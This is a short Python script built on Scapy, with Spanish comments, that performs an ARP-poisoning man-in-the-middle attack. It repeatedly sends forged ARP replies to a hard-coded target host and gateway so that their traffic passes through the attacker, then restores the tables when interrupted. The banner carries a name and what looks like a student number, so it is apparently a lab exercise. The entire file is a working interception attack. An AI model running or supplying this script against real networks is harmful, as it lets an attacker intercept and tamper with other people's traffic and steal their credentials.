from scapy.all import *
import time

def jonath_arp_mitm(ip_target, ip_gateway, interfaz):
    """
    Función principal del ataque ARP MitM.
    Envenena las tablas ARP del target y del gateway
    para interceptar todo el tráfico entre ellos.
    """
    print("=" * 50)
    print("  ARP MitM Attack - Jonathan Sención 20250851")
    print("=" * 50)
    
    # Obtenemos las MACs reales del target y gateway
    mac_target = getmacbyip(ip_target)
    mac_gateway = getmacbyip(ip_gateway)
    
    print(f"[*] Target:  {ip_target} ({mac_target})")
    print(f"[*] Gateway: {ip_gateway} ({mac_gateway})")
    print("[*] Iniciando envenenamiento ARP...")
    print("[*] Presiona Ctrl+C para detener y restaurar\n")
    
    try:
        contador = 0
        while True:
            # Envenenamos la tabla ARP del target
            # Le decimos que el gateway es nuestra MAC
            send(ARP(op=2,
                     pdst=ip_target,
                     hwdst=mac_target,
                     psrc=ip_gateway),
                 verbose=False)
            
            # Envenenamos la tabla ARP del gateway
            # Le decimos que el target es nuestra MAC
            send(ARP(op=2,
                     pdst=ip_gateway,
                     hwdst=mac_gateway,
                     psrc=ip_target),
                 verbose=False)
            
            contador += 1
            print(f"[*] Rondas de envenenamiento ARP: {contador}", end="\r")
            time.sleep(2)
            
    except KeyboardInterrupt:
        # Restauramos las tablas ARP al detener el script
        print("\n\n[*] Deteniendo ataque...")
        print("[*] Restaurando tablas ARP originales...")
        send(ARP(op=2,
                 pdst=ip_target,
                 hwdst=mac_target,
                 psrc=ip_gateway,
                 hwsrc=mac_gateway),
             count=5, verbose=False)
        send(ARP(op=2,
                 pdst=ip_gateway,
                 hwdst=mac_gateway,
                 psrc=ip_target,
                 hwsrc=mac_target),
             count=5, verbose=False)
        print("[*] Tablas ARP restauradas exitosamente")

# Punto de entrada del script
jonath_arp_mitm("192.168.85.20", "192.168.85.1", "eth0")
